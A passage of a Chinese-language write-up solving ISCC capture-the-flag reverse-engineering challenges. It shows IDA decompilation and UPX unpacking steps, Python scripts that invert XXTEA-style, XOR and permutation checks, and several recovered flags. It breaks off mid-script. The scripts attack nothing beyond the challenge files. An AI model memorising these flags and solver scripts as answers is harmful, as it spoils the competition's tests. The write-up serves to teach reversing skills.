title="迷失之门"></a>迷失之门</h4><p>IDA打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7994b16.png" alt="image-20240502115709593"></p><p>TAB&#x2F;F5：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc797b0d5.png" alt="image-20240502115816894"></p><p>跟进check</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc796f29f.png" alt="image-20240502120305168"></p><p>继续跟进check_2</p><p>R转换result</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7833aee.png" alt="image-20240502120439849"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7862bb2.png" alt="image-20240502120535560"></p><p>得到：</p><p>FSBBhKhLgEdDDKeidOpktsBNRI6</p><p>跑脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="string">&#x27;FSBBhKhLgEdDDKeidOpktsBNRI6&#x27;</span><span class="comment">#输入比较的字符</span></span><br><span class="line">W=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">w=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">M=<span class="string">&#x27;0123456789+/-=!#&amp;*()?;:*^%&#x27;</span></span><br><span class="line">v=<span class="string">&#x27;DABBZXQESVFRWNGTHYJUMKIOLPC&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> j-<span class="built_in">ord</span>(v[i])&lt;=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v22=j-<span class="built_in">ord</span>(v[i])</span><br><span class="line">            <span class="keyword">if</span> v22&gt;<span class="number">25</span>:</span><br><span class="line">                <span class="keyword">if</span> v22&gt;<span class="number">51</span>:</span><br><span class="line">                    v1=M[v22-<span class="number">52</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    v1=w[v22-<span class="number">26</span>]</span><br><span class="line">                <span class="keyword">if</span> v1==x[i]:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> W[v22]==x[i]:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc7995bbc.png" alt="image-20240502121808043"></p><p>ISCC{brPsZcUZXevegsyzwJ]X}</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc789a55a.png" alt="image-20240502121859811"></p><h4 id="Badcode"><a href="#Badcode" class="headerlink" title="Badcode"></a>Badcode</h4><blockquote><p>好学的小明又开始学习c++了，他猛猛写了一堆代码，并且很高兴实现了功能，但是我们发现，他的代码写的真的很差，这次他又将自己的秘密藏在里面，你能揭穿他的秘密吗？</p></blockquote><p>把附件拉入IDA Tab&#x2F;f5</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc78b2456.png" alt="image-20240502220802580"></p><p>把数字Buf2转成16进制</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc783e7be.png" alt="image-20240502220952379"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7842ddb.png" alt="image-20240502221035159"></p><p>跑脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        p += <span class="number">1</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n - <span class="number">1</span>] = (v[n - <span class="number">1</span>] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (<span class="number">0</span> - rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    plain = [<span class="number">0xE2122B60</span>, <span class="number">0x6A5F5FB9</span>, <span class="number">0x8B00D411</span>, <span class="number">0x85672DCF</span>, <span class="number">0xCA65C318</span>, <span class="number">0x2757DF85</span>]  <span class="comment"># 输入比较的字符</span></span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x9ABCDEF0</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x76543210</span>]</span><br><span class="line">    decrypted = decrypt(plain, key)</span><br><span class="line">    flag = []</span><br><span class="line">    v16 = <span class="string">&#x27;674094872038771148666737&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        x = long_to_bytes(decrypted[i])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            flag.append(x[j])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        flag[i] ^= <span class="built_in">ord</span>(v16[i]) - <span class="number">0x30</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span>:</span><br><span class="line">            flag[i] -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] += <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc79a6fd9.png" alt="image-20240502222819278"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7867d42.png" alt="image-20240502223320773"></p><h4 id="DLLCode"><a href="#DLLCode" class="headerlink" title="DLLCode"></a>DLLCode</h4><p>一样把附件拖进IDA</p><p>附件有两个：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc782b148.png" alt="image-20240502224944138"></p><p>f5打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc793d8f0.png" alt="image-20240502225943304"></p><p>同样发现一个数组</p><p>跑脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmp = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">114</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">116</span>,<span class="number">43</span>,<span class="number">27</span>,<span class="number">25</span>,<span class="number">20</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">109</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">70</span>,<span class="number">84</span>,<span class="number">64</span>,<span class="number">103</span>,<span class="number">116</span>,<span class="number">125</span>,<span class="number">80</span>,<span class="number">64</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\流量\attachment-7\BEIXUAN-8.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    tmp = f.read()</span><br><span class="line">    <span class="keyword">if</span> tmp[<span class="number">0</span>:<span class="number">3</span>] == <span class="string">b&#x27;\x4d\x5a\x50&#x27;</span>:</span><br><span class="line">        start = <span class="number">0x0b3614</span> + <span class="number">0xcc8</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        start = <span class="number">0xcc8</span></span><br><span class="line">    cmp = [tmp[start + i * <span class="number">10</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>)]</span><br><span class="line">inp1 = cmp[:<span class="number">12</span>]</span><br><span class="line">v7 = cmp[<span class="number">12</span>:]</span><br><span class="line">v4 = [<span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">9</span>]</span><br><span class="line">inp2 = [<span class="number">0</span>] * <span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp2)):</span><br><span class="line">    inp2[i] = v7[v4[i]]</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;ISCC&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp1)):</span><br><span class="line">    inp1[i] ^= <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(inp1[i]) + <span class="built_in">chr</span>(inp2[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc799d45b.png" alt="image-20240502231023964"></p><p>ISCC{Y1mC@VF7ghTRPJtW@@}</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc78cfb97.png" alt="image-20240502231053377"></p><h4 id="CrypticConundrum"><a href="#CrypticConundrum" class="headerlink" title="CrypticConundrum"></a>CrypticConundrum</h4><p>IDA打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc786d121.png" alt="image-20240502232113334"></p><p>只有两个函数</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc782a170.png" alt="image-20240503002452778"></p><p>upx-d脱壳</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7858950.png" alt="image-20240503003218282"></p><p>再跑脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmp = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\流量\cryptic.exe&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    tmp = f.read()</span><br><span class="line">    cmp += tmp[<span class="number">0x1210</span> + <span class="number">2</span>:<span class="number">0x1210</span> + <span class="number">2</span> + <span class="number">8</span>]</span><br><span class="line">    cmp += tmp[<span class="number">0x121e</span> + <span class="number">2</span>:<span class="number">0x121e</span> + <span class="number">2</span> + <span class="number">8</span>]</span><br><span class="line">    cmp += tmp[<span class="number">0x122c</span> + <span class="number">2</span>:<span class="number">0x122c</span> + <span class="number">2</span> + <span class="number">8</span>]</span><br><span class="line">    cmp[<span class="number">22</span>:<span class="number">28</span>] = tmp[<span class="number">0x123a</span> + <span class="number">4</span>:<span class="number">0x123a</span> + <span class="number">4</span> + <span class="number">4</span>]</span><br><span class="line">key1 = <span class="string">&#x27;So--this-is-the-right-flag&#x27;</span></span><br><span class="line">key1_ = []</span><br><span class="line">key2 = <span class="string">&#x27;ISCC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">    cmp[i] -= <span class="number">10</span></span><br><span class="line">    cmp[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) - <span class="number">1</span>):</span><br><span class="line">    cmp[i] += cmp[i + <span class="number">1</span>]</span><br><span class="line">    cmp[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) - <span class="number">1</span>):</span><br><span class="line">    cmp[i] ^= <span class="built_in">ord</span>(key2[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cmp), <span class="number">2</span>):</span><br><span class="line">    cmp[i] ^= <span class="built_in">ord</span>(key2[i % <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) // <span class="number">2</span>):</span><br><span class="line">    cmp[i], cmp[<span class="number">26</span> - i - <span class="number">1</span>] = cmp[<span class="number">26</span> - i - <span class="number">1</span>], cmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) // <span class="number">2</span>):</span><br><span class="line">    cmp[i], cmp[<span class="number">26</span> - i - <span class="number">1</span>] = cmp[<span class="number">26</span> - i - <span class="number">1</span>], cmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">    cmp[i] += <span class="built_in">ord</span>(key2[i % <span class="number">4</span>])</span><br><span class="line">    cmp[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cmp))</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc7945a29.png" alt="image-20240503003247400"></p><p>ISCC{Wi]@z’{‘,W&#x3D;g&amp;Lo&gt;9wY8}</p><h4 id="WinterBegins"><a href="#WinterBegins" class="headerlink" title="WinterBegins"></a>WinterBegins</h4><p><img src="https://bu.dusays.com/2024/05/25/6651fc786e968.png" alt="image-20240508213206897"></p><p>给了个exe文件</p><p>研究一下</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table=<span class="string">&quot;冻笔新诗懒写寒炉美酒时温醉看墨花月白恍疑雪满前村&quot;</span></span><br><span class="line">tmp=<span class="built_in">open</span>(<span class="string">r&quot;E:\QQsavefile\winterbegins (1).exe&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()[<span class="number">0x1c98d</span>:<span class="number">0x1c98d</span>+<span class="number">2</span>*<span class="number">140</span>].decode(<span class="string">&#x27;gbk&#x27;</span>,errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">enc=tmp[:tmp.index(<span class="string">&#x27;\x00&#x27;</span>)]</span><br><span class="line">enc=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join(enc[i+<span class="number">1</span>:i-<span class="number">1</span>:-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">2</span>)])</span><br><span class="line">tmp=[table.find(i)//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> enc[<span class="number">0</span>::<span class="number">2</span>]]</span><br><span class="line">it=<span class="built_in">iter</span>(tmp)</span><br><span class="line">listchar=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">11</span>:</span><br><span class="line">        listchar.append(<span class="built_in">chr</span>(<span class="built_in">next</span>(it)+<span class="number">61</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listchar.append(<span class="built_in">chr</span>(i+<span class="number">48</span>))</span><br><span class="line">tmpflag=<span class="built_in">list</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="built_in">chr</span>(<span class="built_in">int</span>(x,<span class="number">16</span>)),<span class="built_in">map</span>(<span class="keyword">lambda</span> x,y:x+y,listchar[::<span class="number">2</span>],listchar[<span class="number">1</span>::<span class="number">2</span>]))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(tmpflag))</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">sum</span>([ i-<span class="number">1</span>  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmpflag)) <span class="keyword">if</span> tmpflag[i] <span class="keyword">in</span> string.digits])&gt;<span class="number">0</span>:</span><br><span class="line">    index=[ i-<span class="number">1</span>  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmpflag)) <span class="keyword">if</span> tmpflag[i] <span class="keyword">in</span> string.digits][<span class="number">0</span>]</span><br><span class="line">    tmpflag=tmpflag[:index]+[tmpflag[index]]*<span class="built_in">int</span>(tmpflag[index+<span class="number">1</span>])+tmpflag[index+<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(tmpflag))</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc79acc18.png" alt="image-20240508213723635"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc786a677.png" alt="image-20240508213731153"></p><h4 id="Find-All"><a href="#Find-All" class="headerlink" title="Find_All"></a>Find_All</h4><p><img src="https://bu.dusays.com/2024/05/25/6651fc7848929.png" alt="image-20240508214222003"></p><p>两个文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7826cc0.png" alt="image-20240508214335542"></p><p>7z要密码</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc79303d1.png" alt="image-20240508214441198"></p><p>IDA打开看下</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7998b6c.png" alt="image-20240508215227259"></p><p>tap</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc79af9f4.png" alt="image-20240508215257526"></p><p><img src="https://bu.dusays.com/2024/05/13/66420378a79ed.png" alt="image-20240513201135922"></p><p>直接跑python脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v4 = [get_wide_byte(0x00401625 + i * 7) for i in range(24)]</span><br><span class="line">for i in range(0, len(v4) - 1, 4):</span><br><span class="line">    v4[i + 2] ^= v4[i + 3]</span><br><span class="line">    v4[i + 1] ^= v4[i + 2]</span><br><span class="line">    v4[i] ^= v4[i + 1]</span><br><span class="line">print(bytes(v4).decode())</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/66420383ec1f2.png" alt="image-20240513201147452"></p><h4 id="I-am-the-Mathematician"><a href="#I-am-the-Mathematician" class="headerlink" title="I_am_the_Mathematician"></a>I_am_the_Mathematician</h4><p>使用前 20 个斐波那契数作为索引，从code_book中提取字符得到flag</p><p>跑脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">     a,b = <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">     lis = []</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">         a,b =b,a+b</span><br><span class="line">         lis.append(a)</span><br><span class="line">     <span class="keyword">return</span> lis</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(os.getcwd()) <span class="keyword">if</span> i.startswith(<span class="string">&quot;code_book&quot;</span>)][<span class="number">0</span>],<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">     data = file.read()</span><br><span class="line">     file.close()</span><br><span class="line"></span><br><span class="line">target = fib(<span class="number">20</span>)</span><br><span class="line"><span class="keyword">assert</span> target[-<span class="number">1</span>] &gt; <span class="built_in">len</span>(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ISCC&#123;&#123;<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join([data[i - <span class="number">1</span>] <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(data) <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span></span></span></span><br><span class="line"><span class="subst"><span class="string">target])&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6642279a2826c.png" alt="image-20240513224545389"></p><h4 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h4><p>两个文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc782cd46.png" alt="image-20240520221032476"></p><p>直接跑脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install torch</span></span><br><span class="line"><span class="comment"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple torchvision</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_7zname = <span class="string">&#x27;AI-20.7z&#x27;</span>    <span class="comment"># 替换你的路径</span></span><br><span class="line">offset_str = <span class="string">&#x27;123456789012345678901234&#x27;</span></span><br><span class="line">target_base64 = <span class="string">&#x27;TWF/c1sse19GMW5gYVRoWWFrZ3lhd0B9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_base64, offset_str</span>):</span><br><span class="line">    encrypted_bytes = base64.b64decode(encrypted_base64.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    encrypted_str = encrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_str):</span><br><span class="line">        offset = <span class="built_in">int</span>(offset_str[i])</span><br><span class="line">        ascii_val = <span class="built_in">ord</span>(char) ^ offset</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            original_ascii = ascii_val - offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            original_ascii = ascii_val + offset</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>(original_ascii)</span><br><span class="line">        decrypted.append(decrypted_char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = decrypt(target_base64, offset_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Key&#123;Y0u_F1nd_The_key_w@&#125;</span></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"><span class="keyword">with</span> py7zr.SevenZipFile(_7zname, mode=<span class="string">&#x27;r&#x27;</span>, password=key) <span class="keyword">as</span> z:</span><br><span class="line">    z.extractall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch  <span class="comment"># torch基础库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn  <span class="comment"># torch神经网络库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms  <span class="comment"># 图像处理库</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  <span class="comment"># 图像处理库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">28</span> * <span class="number">28</span>, <span class="number">128</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">28</span> * <span class="number">28</span>)</span><br><span class="line">        x = F.relu(self.fc1(x))</span><br><span class="line">        x = F.relu(self.fc2(x))</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = torch.load(<span class="string">&quot;confused_digit_recognition_model.pt&quot;</span>)</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">transform = transforms.Compose(</span><br><span class="line">    [</span><br><span class="line">        transforms.Grayscale(num_output_channels=<span class="number">1</span>),</span><br><span class="line">        transforms.Resize((<span class="number">28</span>, <span class="number">28</span>)),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize((<span class="number">0.5</span>,), (<span class="number">0.5</span>,)),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: <span class="string">&quot;@nd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="string">&quot;a!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2&quot;</span>: <span class="string">&quot;_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3&quot;</span>: <span class="string">&quot;F&quot;</span>,</span><br><span class="line">    <span class="string">&quot;4&quot;</span>: <span class="string">&quot;SSS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5&quot;</span>: <span class="string">&quot;W@&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6&quot;</span>: <span class="string">&quot;K&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;8&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9&quot;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(<span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">    image = transform(image).unsqueeze(<span class="number">0</span>)  <span class="comment"># type:ignore</span></span><br><span class="line">    output = model(image)</span><br><span class="line">    predicted = torch.argmax(output, dim=<span class="number">1</span>)</span><br><span class="line">    flag.append(predicted.item())</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, flag))</span><br><span class="line"><span 